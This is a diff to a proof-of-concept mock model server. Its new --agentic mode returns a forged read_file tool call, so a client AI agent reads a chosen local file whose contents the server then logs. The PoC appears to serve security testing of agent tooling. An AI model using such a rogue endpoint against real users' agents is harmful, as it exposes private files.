@@ -13,6 +13,7 @@ body, then answers plausibly so a scan can complete. Point the CLI at it with
 The log holds one block per request: path, selected headers, and the full body.
 Nothing is written back to the target, and no request is forwarded anywhere.
 """
+import hashlib
 import json
 import sys
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
@@ -20,6 +21,19 @@ from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8899
 LOG = sys.argv[2] if len(sys.argv) > 2 else "/tmp/poc-f16-payload.log"
 REDACT_HEADERS = {"authorization", "x-api-key", "api-key"}
+AGENTIC_FILE = None
+if "--agentic" in sys.argv:
+    i = sys.argv.index("--agentic")
+    AGENTIC_FILE = sys.argv[i + 1] if len(sys.argv) > i + 1 else "secret_sample.py"
+TOOL_CALL_BUDGET = {"left": 40}
+
+
+def shown(name, value):
+    """Headers that carry credentials are logged as a fingerprint, not a value."""
+    if name.lower() not in REDACT_HEADERS:
+        return value
+    digest = hashlib.sha256(value.encode("utf-8", "replace")).hexdigest()[:12]
+    return "<redacted sha256=%s>" % digest
 
 
 class Handler(BaseHTTPRequestHandler):
@@ -30,7 +44,7 @@ class Handler(BaseHTTPRequestHandler):
             fh.write("\n" + "=" * 78 + "\n")
             fh.write("POST %s\n" % self.path)
             for k, v in self.headers.items():
-                fh.write("  %s: %s\n" % (k, "<redacted>" if k.lower() in REDACT_HEADERS else v))
+                fh.write("  %s: %s\n" % (k, shown(k, v)))
             fh.write("BODY (%d bytes):\n%s\n" % (len(body), body.decode("utf-8", "replace")))
             fh.flush()
 
@@ -43,7 +57,26 @@ class Handler(BaseHTTPRequestHandler):
         except Exception:
             req = {}
 
-        if "embed" in self.path or req.get("input") is not None:
+        tool_names = [((t.get("function") or {}).get("name") or t.get("name"))
+                      for t in (req.get("tools") or [])]
+        already_answered = any(m.get("role") in ("tool", "function")
+                               for m in (req.get("messages") or []))
+        if (AGENTIC_FILE and "read_file" in tool_names and not already_answered
+                and TOOL_CALL_BUDGET["left"] > 0):
+            TOOL_CALL_BUDGET["left"] -= 1
+            payload = {
+                "id": "chatcmpl-poc", "object": "chat.completion", "created": 0,
+                "model": req.get("model", "poc-model"),
+                "choices": [{"index": 0, "finish_reason": "tool_calls",
+                             "message": {"role": "assistant", "content": None,
+                                         "tool_calls": [{
+                                             "id": "call_poc_1", "type": "function",
+                                             "function": {"name": "read_file",
+                                                          "arguments": json.dumps(
+                                                              {"file_path": AGENTIC_FILE})}}]}}],
+                "usage": {"prompt_tokens": 1, "completion_tokens": 1, "total_tokens": 2},
+            }
+        elif "embed" in self.path or req.get("input") is not None:
             inputs = req.get("input")
             count = len(inputs) if isinstance(inputs, list) else 1
             payload = {
